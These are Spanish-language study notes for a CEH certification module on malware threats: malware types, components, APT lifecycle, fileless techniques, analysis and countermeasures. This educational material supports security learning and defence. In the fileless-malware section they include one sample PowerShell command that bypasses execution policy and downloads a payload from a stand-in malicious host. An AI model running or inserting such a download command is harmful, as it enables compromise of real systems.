# Módulo 07: Malware Threats (CEHv12)

## 1. Introducción al Malware
- Malware: Software malicioso diseñado para dañar, explotar o deshabilitar sistemas.
- Tipos de malware comunes:
  - Virus: Se replican e infectan archivos legítimos.
  - Gusanos: Se propagan automáticamente por redes.
  - Troyanos: Disfrazados de software legítimo.
  - Ransomware: Secuestra datos y pide rescate.
  - Rootkits: Escalan privilegios y ocultan actividades maliciosas.
  - Spyware: Monitorea actividades del usuario.
  - Adware: Muestra anuncios intrusivos.

## 2. Técnicas de propagación
- Vectores de ataque:
  - Adjuntos de correo maliciosos.
  - Descargas Drive-by (desde sitios web comprometidos).
  - Dispositivos USB infectados.
  - Redes P2P.
  - Métodos de evasión:
    - Polimorfismo y metamorfismo (modifican su código para evitar detección).
    - Obfuscación (ocultan la lógica del malware).
  
## 3. Anatomía del Malware
- Ciclo de vida: Creación, distribución, activación, ejecución, persistencia, y control.
- Componentes comunes:
  - Dropper: Instala el malware.
  - Payload: Realiza la acción maliciosa (robo de datos, cifrado, etc.).
  - C2 (Command and Control): Comunicación con el atacante.
  - Downloader: Descarga payloads adicionales.
  - Crypter: Cifra el código malicioso para evadir detección.
  - Exploits: Aprovechan vulnerabilidades para comprometer sistemas.

## 4. Métodos de detección de Malware
- Basados en firma: Comparación con bases de datos conocidas.
- Análisis heurístico: Identificación de patrones sospechosos.
- Análisis dinámico: Ejecución en sandbox para observar comportamiento.
- Análisis estático: Examina el código sin ejecutarlo.

## 5. Uso de herramientas en análisis de Malware
- Estático:
  - IDA Pro, Ghidra: Ingeniería inversa.
  - BinText: Extracción de cadenas de texto.
-	Dinámico:
  -	Cuckoo Sandbox, Any.Run: Entornos para ejecutar malware de forma segura.
  -	Wireshark: Analiza tráfico de red generado por el malware.
## 6. Técnicas para proteger sistemas
- Prevención:
  - Mantener software actualizado.
  - Configurar firewalls y sistemas IDS/IPS.
  - Usar listas blancas de aplicaciones.
- Remediación:
  - Escaneos regulares con antivirus/antimalware.
  - Desinfección y restauración del sistema.
  - Aislar sistemas comprometidos.

## 7. Indicadores de Compromiso (IoCs)
- Archivos sospechosos: Extensiones inusuales o cambios recientes.
- Tráfico anómalo: Conexiones a dominios desconocidos.
- Procesos desconocidos: Actividades de alto uso de CPU/memoria.


## 8. APTs (Advanced Persistent Threats) y su relación con el Malware

- Definición:Los APTs son ataques dirigidos a largo plazo realizados por grupos avanzados, generalmente patrocinados por estados o entidades con grandes recursos, que buscan infiltrarse y permanecer en sistemas críticos sin ser detectados.
- Relación con el malware:
  - Utilizan malware especializado como herramientas clave para comprometer sistemas, moverse lateralmente y mantener el acceso.
  - Incluyen malware personalizado difícil de detectar, como backdoors, rootkits o ransomware dirigido.
  - Frecuentemente combinan troyanos y exploit kits con técnicas de spear-phishing y vulnerabilidades de día cero.
- Características principales de los APTs:
  - Persistencia: Emplean técnicas como escalada de privilegios, movimientos laterales y mecanismos de persistencia (scripts, servicios maliciosos, etc.).
  - Enfoque en datos: Su objetivo suele ser espionaje, sabotaje o robo de información valiosa.
  - Evasión avanzada: Utilizan polimorfismo, cifrado y evasión de detección para evitar soluciones tradicionales como antivirus.
- Ejemplo de malware APT conocido:
  - Stuxnet: Malware avanzado diseñado para sabotear sistemas industriales.
  - APT28 (Fancy Bear): Grupo que emplea malware personalizado para espionaje en sectores gubernamentales y militares.
- Defensa contra APTs:
  - Monitoreo constante de Indicadores de Compromiso (IoCs).
  - Implementar segmentación de red, autenticación robusta y análisis de tráfico avanzado.
  - Uso de herramientas EDR (Endpoint Detection and Response) para detección temprana.

## 9. Técnicas avanzadas de malware y explotación

- SEO Poisoning (Search Engine Optimization Poisoning)
  - Descripción: Consiste en manipular los resultados de búsqueda en motores como Google o Bing para redirigir a los usuarios a sitios maliciosos. Los atacantes crean páginas web optimizadas para palabras clave populares temas de actualidad para engañar a los motores de búsqueda.
  - Objetivo: Infectar a los usuarios con malware, recopilar datos personales o lanzar campañas de phishing.
  - Cómo funciona:
    - Se usan tácticas de SEO legítimas como metaetiquetas, backlinks y contenido relevante, pero con propósitos maliciosos.
    - Cuando el usuario accede al sitio, se ejecutan scripts maliciosos o se descarga automáticamente un archivo infectado (drive-by download).
  - Defensa:
    - Usar herramientas de análisis de reputación de sitios web.ç
    - Evitar hacer clic en enlaces poco confiables o en sitios desconocidos.
    
2. Clickjacking
•	Descripción:Una técnica que engaña al usuario para que haga clic en elementos invisibles o disfrazados de una página legítima, como botones o enlaces.
•	Ejemplo típico:
o	Un atacante coloca un botón de "Me gusta" de Facebook o una confirmación de compra debajo de un botón visible en una página web. El usuario cree estar interactuando con el contenido legítimo, pero en realidad activa el elemento oculto.
•	Objetivo:Redirigir tráfico, comprometer cuentas o ejecutar comandos maliciosos.
•	Defensa:
o	Implementar encabezados HTTP como X-Frame-Options para evitar que el contenido sea incrustado en iframes.
o	Usar herramientas como Content Security Policy (CSP).
________________________________________
3. Malvertising (Malicious Advertising)
•	Descripción:Uso de publicidad en línea legítima para distribuir malware o redirigir a los usuarios a sitios maliciosos.
•	Funcionamiento:
o	Los atacantes compran espacios publicitarios en redes legítimas, insertan código malicioso y lo distribuyen a millones de usuarios.
o	Los usuarios no necesitan hacer clic en el anuncio; en algunos casos, el simple hecho de cargar la página puede activar el malware.
•	Técnicas comunes:
o	Uso de exploit kits en el anuncio para aprovechar vulnerabilidades del navegador.
o	Inyección de scripts que descargan payloads maliciosos.
•	Defensa:
o	Usar bloqueadores de anuncios confiables.
o	Mantener el navegador y los plugins actualizados.
________________________________________
4. RTF Injection (Rich Text Format Injection)
•	Descripción:Consiste en incrustar código malicioso en archivos RTF (Rich Text Format), explotando vulnerabilidades en aplicaciones que abren estos archivos, como Microsoft Word.
•	Funcionamiento:
o	Los atacantes crean un archivo RTF malicioso que contiene código de explotación en elementos como OLE (Object Linking and Embedding).
o	Al abrir el archivo, el código se ejecuta para descargar y ejecutar malware o permitir el acceso remoto al sistema.
•	Ejemplo:Vulnerabilidad CVE-2017-11882 explotó la función de manejo de ecuaciones en Microsoft Office para ejecutar código malicioso en archivos RTF.
•	Defensa:
o	Deshabilitar macros y OLE en aplicaciones de oficina.
o	Actualizar regularmente el software de ofimática.

5. Drive-by Downloads
•	Descripción_Una técnica en la que el usuario descarga e instala malware sin su conocimiento al visitar un sitio web malicioso o comprometido.
•	Funcionamiento:
o	Exploit kits analizan el navegador o sistema del usuario para identificar vulnerabilidades.
o	Si se encuentra una vulnerabilidad, el sitio web inyecta y ejecuta el malware automáticamente.
•	Defensa:
o	Usar navegadores seguros con plugins actualizados.
o	Configurar entornos de navegación aislados (sandbox).

6. Watering Hole Attacks
•	Descripción:Ataques dirigidos a comprometer sitios web específicos que son frecuentados por la víctima objetivo.
•	Funcionamiento:
o	El atacante compromete un sitio legítimo y coloca scripts maliciosos o redirige tráfico a un servidor controlado.
o	Cuando los usuarios visitan el sitio comprometido, sus sistemas se infectan.
•	Ejemplo:Ataques a páginas relacionadas con sectores gubernamentales o industriales.
•	Defensa:Monitoreo de tráfico web y análisis continuo de sitios web visitados.

7. Fast Flux (y Double Flux)
•	Descripción:Técnica de evasión que usa redes de botnets para cambiar constantemente las direcciones IP asociadas a un dominio malicioso, dificultando su rastreo y bloqueo.
•	Funcionamiento:
o	Fast Flux: Cambios rápidos en los registros DNS para redirigir tráfico a diferentes nodos de la botnet.
o	Double Flux: Cambia tanto las direcciones IP de los dominios como las de los servidores DNS utilizados.
•	Defensa:
o	Implementar listas negras de dominios maliciosos.
o	Usar soluciones de ciberseguridad avanzadas para detectar patrones de tráfico sospechoso.

8. Fileless Malware
•	Descripción:
Malware que no deja rastros en el disco duro, ya que opera únicamente en la memoria RAM, lo que dificulta su detección por soluciones antivirus tradicionales.
•	Ejemplo típico:
o	Uso de herramientas legítimas como PowerShell o WMI (Windows Management Instrumentation) para ejecutar comandos maliciosos.
•	Defensa:
o	Monitoreo de eventos en memoria y uso de soluciones EDR.
o	Restringir el uso de herramientas administrativas innecesarias.

Componentes de un malware
1. Dropper (Cargador inicial)
•	Función:
o	Es un componente diseñado para entregar y desplegar el malware en el sistema de la víctima.
o	Contiene el payload (carga útil) del malware y lo instala de manera sigilosa.
•	Ejemplo:Un ejecutable disfrazado de archivo legítimo que instala troyanos o ransomware.

2. Payload (Carga útil)
•	Función:Es la parte principal del malware, diseñada para realizar la acción maliciosa.
o	Puede incluir actividades como el robo de datos, cifrado de archivos, destrucción de datos o espionaje.
•	Ejemplos de payloads:
o	Keyloggers: Para capturar pulsaciones del teclado.
o	Ransomware: Para cifrar datos y pedir rescates.
o	Backdoors: Para crear accesos remotos persistentes.
3. Exploit
•	Función:
o	Es el código diseñado para aprovechar vulnerabilidades en software, sistemas operativos o redes y permitir que el malware se ejecute.
o	Usualmente forma parte del vector de ataque inicial o del mecanismo de propagación.
•	Ejemplo:
o	EternalBlue: Usado en el ransomware WannaCry para explotar una vulnerabilidad en SMB (CVE-2017-0144).
4. Obfuscation/Encryption Module (Módulo de ofuscación o cifrado)
•	Función:
o	Es el mecanismo que permite ocultar el malware del software de seguridad o análisis manual.
o	Cambia continuamente su código o utiliza cifrado para dificultar su detección y análisis.
•	Técnicas comunes:
o	Polimorfismo: Cambia el código con cada ejecución.
o	Metamorfismo: Reescribe su código, pero mantiene la misma funcionalidad.
5. Propagation Mechanism (Mecanismo de propagación)
•	Función:Permite que el malware se propague a otros sistemas o dispositivos dentro de la red o incluso entre redes.
•	Ejemplos de mecanismos:
o	Exploit kits para buscar vulnerabilidades en otros sistemas.
o	Uso de dispositivos USB infectados.
o	Propagación a través de archivos compartidos o correos electrónicos
6. Command and Control (C&C) Module
•	Función:
o	Permite a los atacantes comunicarse con el malware instalado en el sistema de la víctima.
o	Facilita acciones como enviar comandos, robar datos o actualizar el malware.
•	Ejemplo: Un servidor remoto que da instrucciones al malware para exfiltrar datos o lanzar ataques DDoS.

7. Persistence Mechanism (Mecanismo de persistencia)
•	Función:Asegura que el malware permanezca activo en el sistema incluso después de reinicios o intentos de eliminación.
•	Ejemplos:
o	Creación de entradas en el registro de Windows para ejecutarse al inicio.
o	Modificación de scripts de arranque en sistemas Linux.
o	Uso de rootkits para esconderse en niveles bajos del sistema operativo.
8. Evasion Techniques (Técnicas de evasión)
•	Función:Diseñado para evitar ser detectado por antivirus, firewalls y otras herramientas de seguridad.
•	Ejemplos:
o	Inyección de código en procesos legítimos del sistema.
o	Operar solo en memoria (fileless malware).
o	Detectar entornos de análisis como sandboxes y actuar diferente en esos contextos.
9. Exfiltration Module (Módulo de exfiltración)
•	Función:Responsable de recopilar, empaquetar y enviar datos robados al atacante.
•	Ejemplos:
o	Enviar credenciales almacenadas mediante HTTP, FTP o DNS Tunneling.
o	Exfiltrar archivos sensibles hacia servidores remotos controlados por el atacante.
10. Trigger Mechanism (Mecanismo de activación)
•	Función:Define cuándo y cómo el malware debe activarse.
•	Tipos de activación:
o	Basado en tiempo: Activación en una fecha o hora específica.
o	Basado en eventos: Ejecución al abrir una aplicación o archivo concreto.
o	Basado en comandos: Activación desde el servidor C&C.
11. Anti-Analysis Techniques
•	Función: Impiden que el malware sea analizado en entornos de laboratorio o por expertos en seguridad.
•	Ejemplos:
o	Detectar entornos virtualizados como VMware o VirtualBox.
o	Pausar su ejecución si detecta depuradores como OllyDbg o IDA Pro.
o	Uso de código cifrado y desencriptación dinámica en la memoria.
12. Logging/Reporting (Módulo de registro o reporte)
•	Función:
o	Registra el éxito del ataque o recopila información sobre el sistema comprometido.
o	Puede informar al atacante sobre la cantidad de datos robados o el alcance del daño realizado.

1. Potentially Unwanted Applications (PUA)
Definición PUA se refiere a aplicaciones que no son necesariamente maliciosas, pero son indeseadas o pueden causar efectos no deseados, como ralentización del sistema, consumo de recursos o recopilación de datos personales sin consentimiento explícito.
Características principales
•	Instalación oculta:Generalmente se instalan junto con otro software, como parte de un paquete (bundleware).
•	Uso intrusivo:Modificación de navegadores, barras de herramientas o configuraciones del sistema.
•	Funcionalidad dudosa:Ofrecen servicios que no cumplen lo prometido o que no son útiles.
Ejemplos comunes
•	Barras de herramientas adicionales en navegadores (browser toolbars).
•	Optimizadores de sistema falsos.
•	Software de seguimiento de usuarios para marketing.
Impactos negativos
•	Reducción del rendimiento del sistema.
•	Cambios en la configuración del navegador (página de inicio, motor de búsqueda).
•	Riesgo de exposición a otros tipos de malware.
Prevención y eliminación
•	Descarga desde fuentes confiables: Evitar instalar software de sitios no verificados.
•	Revisión de instaladores: Optar por instalaciones personalizadas para evitar software adicional.
•	Herramientas de eliminación: Usar antivirus con capacidades de detección de PUAs.

2. Adware
DefiniciónSoftware diseñado para mostrar publicidad intrusiva al usuario, a menudo sin su consentimiento o de forma excesiva.
Características principales
•	Modificaciones: Cambia la configuración del navegador o instala extensiones.
•	Recolección de datos: Registra el comportamiento en línea del usuario para mostrar anuncios dirigidos.
•	Intrusividad: Genera ventanas emergentes (pop-ups), redirige búsquedas y ralentiza el sistema.
Ejemplos comunes
•	Publicidad emergente en navegadores.
•	Redireccionamiento de URLs hacia sitios patrocinados.
•	Banners integrados en aplicaciones descargadas gratuitamente.
Impactos negativos
•	Ralentización del sistema por alto consumo de recursos.
•	Vulnerabilidades añadidas al sistema que pueden permitir la entrada de malware.
•	Recolección y venta de datos personales.
Prevención y eliminación
•	Fuentes confiables: Descargar aplicaciones solo de sitios oficiales.
•	Herramientas anti-malware: Detectan y eliminan adware.
•	Bloqueadores de publicidad: Evitan la aparición de anuncios intrusivos.


3. Advanced Persistent Threat (APT)
Definición Una APT es un ataque cibernético prolongado y dirigido a organizaciones específicas, generalmente con el objetivo de robar información confidencial, espiar o causar daño estratégico.
Características principales
•	Objetivos específicos: Ataques a gobiernos, empresas grandes o infraestructuras críticas.
•	Persistencia: Los atacantes permanecen en el sistema durante largos períodos.
•	Alta sofisticación: Utilizan múltiples técnicas avanzadas para evitar la detección y garantizar el acceso continuo.
Ciclo de vida de un APT
1.	Reconocimiento inicial (Initial Reconnaissance):
o	Investigación detallada del objetivo para identificar vulnerabilidades.
o	Métodos: OSINT, footprinting y técnicas de ingeniería social.
2.	Compromiso inicial (Initial Intrusion):
o	Explotación de vulnerabilidades para obtener acceso inicial.
o	Métodos:
	Phishing dirigido.
	Uso de exploits personalizados.
3.	Establecimiento de acceso (Establish Foothold):
o	Implantación de malware o puertas traseras para garantizar el acceso persistente.
o	Métodos:
	Instalación de rootkits o backdoors.
	Configuración de credenciales robadas.
4.	Elevación de privilegios (Privilege Escalation):
o	Obtención de privilegios administrativos en el sistema comprometido.
o	Métodos:
	Explotación de vulnerabilidades del sistema operativo.
	Captura de credenciales.
5.	Movimiento lateral (Lateral Movement):
o	Propagación a otros sistemas dentro de la red objetivo.
o	Métodos:
	Exploits SMB, RDP o herramientas como Mimikatz.
	Robo de credenciales para acceder a sistemas adicionales.
6.	Persistencia (Maintain Presence):
o	Garantizar acceso continuo sin ser detectados.
o	Métodos:
	Modificaciones en el sistema para reinfección tras reinicios.
	Uso de mecanismos avanzados de ofuscación.
7.	Exfiltración de datos (Data Exfiltration):
o	Robo de información confidencial y envío a servidores controlados por los atacantes.
o	Métodos:
	Túneles cifrados (HTTP, HTTPS, DNS Tunneling).
	Extracción gradual para evitar alarmas.
8.	Cobertura de huellas (Cover Tracks):
o	Eliminar registros, limpiar archivos temporales y desactivar alarmas para dificultar el análisis forense.
Ejemplo de APT famoso
•	Stuxnet: Malware que atacó instalaciones nucleares en Irán mediante la explotación de vulnerabilidades en sistemas SCADA.
Prevención y mitigación de APTs
1.	Monitoreo continuo: Uso de sistemas SIEM para identificar actividad sospechosa.
2.	Segmentación de redes: Limitar el movimiento lateral.
3.	Parcheo de vulnerabilidades: Actualizar software y sistemas operativos regularmente.
4.	Entrenamiento del personal: Reducir ataques de ingeniería social.
5.	Análisis de comportamiento: Identificar patrones anómalos en los sistemas.


Troyanos (Trojan Horses)
Definición
•	Un troyano es un tipo de malware que aparenta ser un programa legítimo o útil, pero contiene código malicioso que ejecuta acciones dañinas en el sistema.
•	A diferencia de virus o gusanos, los troyanos no se replican automáticamente, pero permiten el acceso remoto al atacante.
Usos comunes de los troyanos
1.	Acceso remoto (Remote Access Trojans - RATs):
o	Permiten al atacante controlar el sistema infectado de forma remota.
o	Usos: espionaje, robo de datos o instalación de otros tipos de malware.
2.	Exfiltración de datos:
o	Roban credenciales, documentos o información sensible.
o	Ejemplo: Zeus, que roba datos financieros.
3.	Creación de botnets:
o	Control de múltiples dispositivos para realizar ataques DDoS o minería de criptomonedas.
4.	Puertas traseras (Backdoors):
o	Mantienen acceso persistente al sistema infectado.
5.	Desactivación de seguridad:
o	Modifican o eliminan configuraciones de antivirus y cortafuegos.
Tipos de Troyanos
1.	Troyanos bancarios:
o	Diseñados para robar credenciales bancarias y detalles financieros.
o	Ejemplo: Emotet, Dridex.
2.	Troyanos de espionaje:
o	Capturan información confidencial mediante keyloggers, screenshots o micrófonos.
o	Ejemplo: Agent Tesla.
3.	Troyanos de ransomware:
o	Encriptan archivos del sistema y exigen un rescate para su recuperación.
o	Ejemplo: CryptoLocker.
4.	Troyanos de descarga (Downloaders):
o	Instalan otros tipos de malware en el sistema infectado.

Droppers
•	Programas maliciosos diseñados para introducir y ejecutar malware en un sistema objetivo.
•	Características:
o	Generalmente pequeños y difíciles de detectar por los antivirus.
o	Su única tarea es entregar y ejecutar el payload malicioso.
•	Ejemplo: Un dropper puede instalar un RAT o ransomware.
Downloaders
•	Similar a un dropper, pero en lugar de incluir el payload, descarga el malware desde un servidor externo.
•	Características:
o	Requiere conexión a internet.
o	Menos sospechoso, ya que su tamaño inicial es pequeño.
•	Ejemplo: Un downloader puede descargar un troyano bancario.
Wrappers (Empaquetadores)
•	Herramientas que combinan archivos legítimos con malware para ocultar el código malicioso.
•	Ejemplo: Un instalador de un juego gratuito que incluye un RAT.
Uso en ataques
•	Ofuscación: El atacante empaqueta el malware con un programa que el usuario confía.
•	Distribución: Se utiliza como señuelo para convencer al usuario de ejecutar el archivo.
Crypters (Cifradores)
•	Software que cifra malware para evadir la detección por antivirus o herramientas de seguridad.
•	Dos componentes principales:
1.	Stub: Código que descifra y ejecuta el malware en el sistema objetivo.
2.	Payload: El malware cifrado.
Técnicas utilizadas
•	Ofuscación: Cambiar las cadenas o estructuras del malware para que sea irreconocible.
•	Polimorfismo: Cambiar el código cifrado con cada ejecución.
•	Metamorfismo: Alterar tanto el código cifrado como el descifrador.
Exploit Kits
•	Herramientas automatizadas que explotan vulnerabilidades en sistemas o navegadores para instalar malware.
•	Normalmente se alojan en sitios web comprometidos o maliciosos.
Funcionamiento de un Exploit Kit
1.	Redirección:
o	El usuario es redirigido a una página infectada, generalmente mediante técnicas como malvertising o phishing.
2.	Escaneo de vulnerabilidades:
o	El exploit kit analiza el sistema del usuario para identificar vulnerabilidades.
3.	Explotación:
o	Utiliza exploits para ejecutar código malicioso en el sistema.
4.	Entrega del payload:
o	Descarga e instala el malware en el sistema comprometido.
Ejemplos de Exploit Kits
•	Angler Exploit Kit: Explotaba vulnerabilidades en Flash y Java.
•	Rig Exploit Kit: Enfocado en ataques ransomware y troyanos bancarios.

Conclusión
•	Troyanos: Herramientas versátiles que permiten acceso remoto, robo de información y otras actividades maliciosas.
•	Droppers y Downloaders: Vehículos para entregar malware en sistemas comprometidos.
•	Wrappers y Crypters: Técnicas de ofuscación para ocultar malware.
•	Exploit Kits: Plataformas automatizadas que explotan vulnerabilidades para instalar malware sin interacción directa del atacante.
Virus
•	Un virus es un programa malicioso diseñado para infectar archivos o sistemas, replicarse y propagarse a otros sistemas.
•	Requiere interacción del usuario para activarse (por ejemplo, abrir un archivo infectado).
Características principales
1.	Requiere un host: Se adjunta a archivos o programas legítimos para ejecutarse.
2.	Propagación: Se replica al infectar otros archivos o dispositivos.
3.	Interacción del usuario: Normalmente se activa cuando el usuario ejecuta el archivo infectado.
4.	Acciones dañinas:
o	Elimina o modifica datos.
o	Consume recursos del sistema.
o	Desactiva software de seguridad.
Ciclo de vida de un virus
1.	Fase inactiva (Dormant):
o	El virus permanece latente, sin ejecutarse.
o	Puede estar a la espera de condiciones específicas (como una fecha).
2.	Fase de propagación (Propagation):
o	El virus se replica y se anexa a otros archivos o sistemas.
o	Métodos comunes de propagación: unidades USB, correo electrónico, descargas, etc.
3.	Fase de activación (Triggering):
o	Se activa el código malicioso cuando se cumplen ciertas condiciones (como abrir un archivo infectado).
4.	Fase de ejecución (Execution):
o	El virus lleva a cabo su carga maliciosa, como eliminar datos o tomar el control del sistema.
Tipos de virus
1.	Virus residentes:
o	Permanecen en la memoria RAM del sistema y afectan cualquier programa que se ejecute.
2.	Virus no residentes:
o	Infectan un archivo y se ejecutan únicamente cuando ese archivo es abierto.
3.	Virus de sector de arranque:
o	Infectan el registro de inicio maestro (MBR) y se activan al encender el sistema.
4.	Virus polimórficos:
o	Cambian su código cada vez que se replican para evadir los antivirus.
5.	Virus metamórficos:
o	Alteran completamente su estructura sin cambiar su funcionalidad.
6.	Macrovirus:
o	Infectan documentos que contienen macros, como los de Microsoft Office.
7.	Virus multipartitos:
o	Infectan múltiples partes del sistema, como archivos y sectores de arranque, simultáneamente.
________________________________________
Cómo trabajan los virus
1.	Se adjuntan a un archivo o programa legítimo.
2.	Se propagan cuando el archivo infectado es copiado o compartido.
3.	Se activan al ser ejecutados, ejecutando el payload malicioso.

Worms (Gusanos)
•	Un gusano es un tipo de malware que se replica automáticamente sin necesidad de un host ni interacción del usuario.
•	Se propaga rápidamente a través de redes, correos electrónicos o dispositivos conectados.
Características principales
1.	Autónomos: No requieren un archivo o programa anfitrión para ejecutarse.
2.	Alta capacidad de propagación: Infectan redes completas en poco tiempo.
3.	Consumen recursos: Pueden saturar redes y sistemas al replicarse masivamente.
Ciclo de vida de un gusano
1.	Exploración (Scanning):
o	El gusano busca dispositivos vulnerables en la red.
o	Técnicas utilizadas: escaneo de puertos, explotación de vulnerabilidades conocidas.
2.	Explotación:
o	Usa un exploit para comprometer un sistema (por ejemplo, vulnerabilidades en servicios o protocolos).
3.	Carga maliciosa (Payload):
o	Dependiendo del objetivo, puede:
	Instalar un backdoor.
	Robar información.
	Convertir el dispositivo en parte de una botnet.
4.	Propagación:
o	Se replica automáticamente y busca nuevos sistemas en la red.
Tipos de gusanos
1.	Gusanos de red:
o	Propagación a través de redes locales o internet.
o	Ejemplo: WannaCry.
2.	Gusanos de correo electrónico:
o	Se envían como adjuntos maliciosos o enlaces en correos electrónicos.
o	Ejemplo: ILOVEYOU Worm.
3.	Gusanos de mensajería instantánea:
o	Infectan mediante aplicaciones de mensajería.
4.	Gusanos de internet:
o	Propagación a través de aplicaciones basadas en la web o navegadores.
Diferencias clave entre virus y gusanos
Característica	Virus	Gusano
Requiere host	Sí	No
Propagación	Necesita interacción del usuario	Automática
Objetivo principal	Infectar archivos/programas	Infectar redes
Velocidad de ataque	Lenta	Rápida

Exploit kits y gusanos
•	Los gusanos suelen aprovechar vulnerabilidades mediante exploit kits para escanear y comprometer sistemas rápidamente.
•	Ejemplo: EternalBlue fue un exploit utilizado por el gusano WannaCry.

Conclusión
•	Los virus y gusanos son amenazas comunes en ciberseguridad con características, ciclos de vida y métodos de ataque distintos.
•	Es fundamental identificar patrones de comportamiento de estos malwares para implementar medidas preventivas y reactivas, como parches de seguridad, firewalls y sistemas IDS/IPS.

Fileless Malware
•	Fileless malware no utiliza archivos tradicionales para infectar un sistema.
•	Opera directamente en la memoria del sistema (RAM), sin dejar rastros en el disco duro, dificultando su detección por herramientas tradicionales como antivirus.
Características principales
1.	No deja huella: No utiliza archivos ejecutables en disco; reside en la memoria.
2.	Difícil de detectar: Es invisible para los antivirus basados en firmas tradicionales.
3.	Uso de herramientas legítimas: Abusa de programas confiables del sistema, como PowerShell, WMI, o scripts integrados.
4.	Persistencia limitada: Desaparece cuando el sistema se reinicia, a menos que utilice técnicas avanzadas de persistencia.
5.	Vector de ataque: Puede entrar a través de documentos maliciosos, exploits en navegadores o scripts inyectados en memoria.
Taxonomía del Fileless Malware
Tipo 1: Basado en Memoria (In-Memory)
•	Totalmente residente en la memoria.
•	Ejemplo: Ataques que utilizan PowerShell scripts maliciosos o comandos WMI ejecutados directamente desde la memoria.
•	Ventajas del atacante:
o	No deja artefactos en el disco.
o	Se ejecuta más rápido.
•	Desventajas:
o	Pierde persistencia al reiniciar el sistema.
Tipo 2: Lanzado desde Exploits Documentales
•	Se basa en documentos maliciosos que aprovechan vulnerabilidades en aplicaciones como:
o	Microsoft Office.
o	Adobe Reader.
•	Ejemplo:
o	Un archivo Word con macros maliciosas que ejecutan un script de PowerShell para descargar payloads en memoria.
•	Técnicas comunes:
o	RTF Injection: Inyección de código malicioso en documentos RTF.
o	Macros maliciosas: Scripts VBA para ejecutar comandos.
Tipo 3: Inyecciones de Código (Code Injection)
•	Inyecta código directamente en procesos legítimos.
•	Ejemplo:
o	Inyección DLL (Dynamic Link Library).
o	Técnica de Process Hollowing, que reemplaza el código de un proceso con uno malicioso.
•	Objetivo:
o	Esconderse dentro de procesos confiables como explorer.exe o svchost.exe.
Técnicas de Lanzamiento de Fileless Malware
1. Document Exploits
•	Qué es:
o	Uso de documentos infectados (Word, Excel, PDF) que ejecutan comandos maliciosos.
•	Cómo funciona:
o	Contienen macros o scripts maliciosos que ejecutan payloads.
•	Ejemplo:
o	CVE-2017-0199: Una vulnerabilidad de Office que permitía ejecutar código remoto al abrir un documento malicioso.
2. In-Memory Execution
•	Qué es:
o	El malware se carga directamente en la memoria.
•	Cómo funciona:
o	No escribe en disco; se ejecuta directamente utilizando herramientas como PowerShell o MSHTA.
•	Ejemplo:
o	Exploits que aprovechan fallos en navegadores para inyectar código en memoria.
3. Script Injection
•	Qué es:
o	Inyección de scripts maliciosos en navegadores o herramientas legítimas del sistema.
•	Cómo funciona:
o	Puede ejecutarse desde scripts de PowerShell o mediante cross-site scripting (XSS).
•	Ejemplo:
o	Un script inyectado que descarga y ejecuta un payload en memoria.
4. Living off the Land Binaries (LOLBins)
•	Qué es:
o	Uso de binarios legítimos del sistema para ejecutar actividades maliciosas.
•	Herramientas comunes:
o	PowerShell, WMI, regsvr32, certutil.
•	Cómo funciona:
o	Comandos maliciosos se ejecutan directamente a través de binarios confiables para evadir detecciones.
5. Browser Exploits (Exploit Kits)
•	Qué es:
o	Vulnerabilidades en navegadores permiten ejecutar código en memoria.
•	Cómo funciona:
o	El exploit se carga al visitar una página web comprometida.
•	Ejemplo:
o	Angler Exploit Kit, que infectaba sistemas vulnerables con ransomware y fileless malware.
Herramientas y métodos asociados
PowerShell
•	Herramienta administrativa legítima utilizada para ejecutar comandos maliciosos en memoria.
•	Ejemplo de comando malicioso:
bash
Copiar código
powershell.exe -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri http://malicioussite.com -OutFile payload.ps1"
Windows Management Instrumentation (WMI)
•	Framework de administración utilizado para ejecutar scripts maliciosos o mover malware entre sistemas.
Macros Maliciosas (VBA)
•	Utilizadas en documentos de Office para ejecutar comandos maliciosos.
•	Ejemplo:
o	Un macro VBA que ejecuta PowerShell para descargar y ejecutar payloads en memoria.
Dynamic Code Injection
•	Técnicas para inyectar código malicioso en procesos en ejecución:
o	DLL Injection: Inyectar una DLL maliciosa en procesos legítimos.
o	Process Hollowing: Cargar un proceso legítimo y reemplazar su código con código malicioso.
Medidas de prevención y mitigación
1.	Deshabilitar macros: Configurar software de oficina para deshabilitar macros no confiables.
2.	Endpoint Detection & Response (EDR): Monitorear y detectar comportamientos anómalos en memoria.
3.	Parcheo regular: Mantener sistemas y aplicaciones actualizados para cerrar vulnerabilidades explotables.
4.	PowerShell Constrained Language Mode: Restringir la ejecución de comandos no confiables.
5.	Segmentación de red: Limitar la propagación del malware a través de subredes.

	Demonstrar el proceso de análisis de malware
El análisis de malware es el proceso de estudiar un archivo o programa sospechoso para comprender su funcionalidad, impacto y mitigar amenazas. Los pasos clave incluyen:
1.	Análisis estático: Examina el archivo sin ejecutarlo, utilizando herramientas como strings, IDA Pro o Ghidra. Se identifican firmas, hashes, patrones y dependencias.
2.	Análisis dinámico: Observa el comportamiento del malware al ejecutarlo en un entorno controlado (sandbox o máquina virtual). Aquí se analizan cambios en archivos, claves de registro, conexiones de red y procesos.
3.	Análisis de memoria: Utiliza herramientas como Volatility para examinar artefactos en la RAM mientras el malware se ejecuta. Esto revela datos sensibles como cargas útiles o credenciales.
4.	Documentación y reporte: Registrar el flujo, los indicadores de compromiso (IoC) y las técnicas utilizadas para preparar contramedidas.

	Explicar contramedidas contra malware
Las contramedidas contra el malware buscan prevenir, detectar y eliminar amenazas antes de que comprometan un sistema. Principales enfoques:
1.	Prevención:
o	Actualización constante de sistemas operativos y software.
o	Uso de herramientas de seguridad como firewalls y EDR (Endpoint Detection and Response).
o	Restricciones de ejecución mediante listas blancas y control de aplicaciones.
o	Capacitación de usuarios para evitar phishing y prácticas inseguras.
2.	Detección:
o	Implementar soluciones SIEM (Security Information and Event Management).
o	Monitoreo de actividad sospechosa en la red y sistemas locales.
o	Identificación de IoCs y uso de reglas YARA.
3.	Respuesta y eliminación:
o	Aislar sistemas infectados para evitar propagación.
o	Escaneo profundo con herramientas antimalware y eliminación de archivos infectados.
o	Restaurar sistemas desde copias de seguridad limpias.

	Demonstrar el uso de software antimalware
El software antimalware es clave para identificar y mitigar malware. Funciones esenciales incluyen:
1.	Escaneo y detección:
o	Escaneo en tiempo real para bloquear archivos maliciosos antes de su ejecución.
o	Escaneos programados y personalizados para detectar infecciones latentes.
2.	Cuarentena y eliminación:
o	Aislar y neutralizar archivos sospechosos para evitar su propagación.
o	Eliminar malware y restaurar archivos del sistema si es posible.
3.	Protección avanzada:
o	Uso de técnicas de heurística y análisis basado en comportamiento.
